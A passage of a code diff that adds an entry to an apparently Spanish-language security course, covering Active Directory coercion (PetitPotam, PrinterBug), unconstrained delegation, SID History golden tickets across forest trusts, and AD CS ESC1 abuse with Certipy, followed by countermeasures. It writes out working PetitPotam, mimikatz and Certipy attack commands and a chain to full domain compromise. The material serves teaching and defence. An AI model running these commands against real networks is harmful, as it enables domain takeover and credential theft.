/msdsspn:CIFS/target /ptt\n```\n\n**Coercion attacks (para trigger delegation):**\n\n**PetitPotam (2021):**\nForzar Windows Server (incluyendo DC) a autenticarse a un attacker-controlled IP via MS-EFSRPC:\n```bash\nPetitPotam.py -u user -p pass 10.0.0.1 dc.corp.local  # DC autentica hacia 10.0.0.1\n```\n\n**PrinterBug / SpoolSample:**\nSimilar via Print Spooler (MS-RPRN). Usa `SpoolSample.exe`.\n\n**DFSCoerce:**\nVia DFS-R (Distributed File System Replication).\n\n**Chain típico:**\n1. PetitPotam contra DC → autentica hacia el server que control  \n2. Ese server tiene Unconstrained Delegation → captura el TGT del DC\n3. Golden Ticket forge con krbtgt hash from the DC\n4. Full domain compromise\n\n**Cross-forest trusts:**\n\n**Trust types:**\n• **Two-way transitive** — bidireccional entre parent + child (default AD forest)\n• **External trust** — non-transitive, entre forests separados\n• **Forest trust** — transitive entre forests\n• **Selective authentication** — más restrictivo (por default cierra escalada)\n\n**SID History abuse:**\nAl migrar users entre dominios (Microsoft ADMT), Windows guarda el SID original en `sIDHistory`. Un attacker con DA en dominio A puede injectar SIDs de dominio B → si trust no filtra SIDs, escalada cross-domain.\n\n```powershell\n# mimikatz con DA de dominio A\nmimikatz # kerberos::golden /user:Administrator /domain:trustee.local /sid:SID_TRUSTEE /krbtgt:HASH /sids:SID_ENT_ADMINS_OF_TRUSTED /ptt\n# Golden Ticket con SIDs de Enterprise Admins del OTRO forest\n```\n\n**SID Filtering** (habilitado por default en forest trusts modernas) mitiga esto, pero muchos legacy trusts lo tienen deshabilitado.\n\n**BloodHound cross-forest analysis:**\n```cypher\n// Shortest path desde un user del dominio A a un asset del dominio B\nMATCH p = shortestPath((u:User {domain:'A.LOCAL'})-[*1..]->(g:Group {name:'ENTERPRISE ADMINS@B.LOCAL'}))\nRETURN p\n```\n\n**Certified Pre-Owned (SpecterOps, 2021):**\nAttacks contra AD Certificate Services. **ESC1-ESC15** — misconfigs cataloged that lead to persistence + escalation. **ESC1** (Enrollee Supplies Subject) es más común — cualquier user puede request cert as anyone else.\n\n**Herramienta:** `Certipy` (Linux/Python) y `Certify` (Windows/C#).\n```bash\ncertipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable\ncertipy req -template VulnTemplate -upn administrator@corp.local -u user@corp.local -p pass\n# Obtienes cert as Administrator → autenticación PKINIT → TGT → shell\n```\n\n**Contramedidas:**\n• **Deshabilitar Unconstrained Delegation** — no la uses; migrar a RBCD.\n• **Protected Users group** — TGT lifetime shorter, no delegation.\n• **MS-DS-Machine-Account-Quota = 0** — evita user creation de computer accounts (fix RBCD abuse).\n• **SID Filtering** en todos los trusts.\n• **Selective authentication** en cross-forest trusts.\n• **AD CS hardening** — no `Enrollee Supplies Subject`, cert manager approval requerido.\n• **Kerberos AES-only** — dificulta hash cracking.\n> 💡 **BloodHound + ADCS module (Certipy)** son las tools moderna para cross-forest attack path analysis.\n> ⚠️ Legacy Windows environments (pre-2019) tienen delegation misconfigs everywhere. Golden path de red team engagement mid-market.",
+    examples: [
+      "Certified Pre-Owned (SpecterOps 2021): 15 técnicas de escalation via AD CS, altamente impactante.",
+      "PetitPotam (2021): coercion + unconstrained → DC compromise en < 5 minutos.",
+      "M&A escenarios: cross-forest trusts sin SID filtering permiten escalada horizontal.",
+    ],
+    related: ["Ataques a Active Directory", "Silver, Golden, Diamond y Sapphire tickets", "DCSync, DCShadow y DPAPI dumping", "LDAP enumeration y BloodHound"],
   },
 
   // ── M34 · Ingeniería Social ──────────────────────────────────────────────
